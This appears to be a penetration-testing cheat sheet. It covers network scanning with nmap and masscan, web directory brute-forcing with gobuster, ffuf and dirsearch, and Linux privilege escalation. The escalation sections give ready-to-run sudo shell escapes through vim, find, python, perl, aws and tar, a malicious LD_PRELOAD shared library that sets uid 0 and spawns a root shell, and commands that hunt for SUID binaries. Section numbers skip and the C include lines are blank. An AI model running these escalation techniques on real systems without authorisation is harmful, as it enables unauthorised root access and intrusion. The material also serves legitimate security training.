📡 Network Scanning & Reconnaissance

Discovering networks, hosts, and services

2.1 Nmap - Complete Guide

Basic Scanning

Host Discovery 
nmap -sn 192.168.1.0/24                # Ping scan
nmap -sn 192.168.1.1-100              # Range scan
nmap -sn --exclude 192.168.1.50 192.168.1.0/24  # Exclude IP
Port Scanning Techniques 
nmap -sS 192.168.1.1                  # TCP SYN Stealth
nmap -sT 192.168.1.1                  # TCP Connect
nmap -sU 192.168.1.1                  # UDP Scan
nmap -sN 192.168.1.1                  # TCP Null
nmap -sF 192.168.1.1                  # TCP FIN
Service & Version Detection 
nmap -sV 192.168.1.1                  # Version detection
nmap -sV --version-intensity 9 192.168.1.1  # Aggressive version
nmap -sV --version-light 192.168.1.1  # Light version
NSE Scripts 
nmap --script=vuln 192.168.1.1        # Vulnerability scan
nmap --script=http-enum 192.168.1.1   # HTTP enumeration
nmap --script=smb-enum-shares 192.168.1.1  # SMB shares
2.2 Masscan & Netdiscover

Masscan - Ultra Fast Scanner

Basic Usage 
masscan 192.168.1.0/24 -p80,443,22,21,25
masscan 10.0.0.0/8 -p1-65535 --rate=10000
Netdiscover - ARP Scanning 
netdiscover -r 192.168.1.0/24          # Passive scan
netdiscover -i eth0 -r 192.168.1.0/24   # Specific interface

🌐 Web Application Enumeration

Discovering directories, files, and hidden content

3.1 Gobuster - Directory Bruteforcing

Basic Directory Scanning

Standard Scan 
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
With Extensions 
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html,js
Recursive Scan 
gobuster dir -u http://target.com -w wordlist.txt -x php -t 50 -r

Virtual Host Discovery

VHost Scanning 
gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

FFuF - Fast Web Fuzzer

Basic Directory Fuzzing 
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
Parameter Fuzzing 
ffuf -u http://target.com/script.php?FUZZ=test -w param-list.txt
Filter by Status Code 
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302

Dirsearch - Web Path Scanner

Basic Scan 
python3 dirsearch.py -u http://target.com -e php,html,js
Recursive Scan 
python3 dirsearch.py -u http://target.com -e php -r -R 3

5.1 SUDO Enumeration & Exploitation

Step 1: Check SUDO Permissions

List Allowed Commands 
sudo -l
sudo -l 2>/dev/null
Check for NOPASSWD 
sudo -l | grep NOPASSWD

Step 2: Common Exploitation Methods

Vim/VI Editor
sudo vim -c ':!/bin/sh'
sudo vi -c ':!/bin/bash'
Find Command
sudo find . -exec /bin/sh \; -quit
sudo find /home -exec /bin/bash \;
Python
sudo python -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
Perl
sudo perl -e 'exec "/bin/sh";'
AWS CLI
sudo aws help; !/bin/bash
Tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
5.2 SUDO Environment Variables

LD_PRELOAD Exploit

Create Malicious Library 
cd /tmp
cat > shell.c << EOF
#include 
#include 
#include 
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
Execute with SUDO 
sudo LD_PRELOAD=/tmp/shell.so

🚩 SUID/SGID Privilege Escalation

Exploiting binaries with SUID/SGID permissions

6.1 Finding SUID/SGID Binaries

Enumeration Commands

Find SUID Binaries 
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
Find SGID Binaries 
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
Find SUID/SGID with Root 
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -type f 2>/dev/null
